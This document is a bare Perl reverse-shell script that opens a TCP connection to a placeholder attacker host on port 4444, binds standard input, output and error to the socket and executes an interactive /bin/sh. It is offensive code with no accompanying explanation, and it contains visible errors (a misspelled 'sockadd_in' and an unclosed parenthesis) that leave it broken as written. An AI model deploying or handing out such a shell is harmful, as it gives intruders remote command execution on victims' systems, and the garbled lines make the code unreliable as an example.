#!/usr/bin/perl
use Socket;
$i="attackerip";
$p=4444;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockadd_in($p,inet_aton($i)))){
  open(STDIN,">&S";
  open(STDOUT, ">&S");
  open(STDERR, ">&S");
  exec("/bin/sh -i");
}
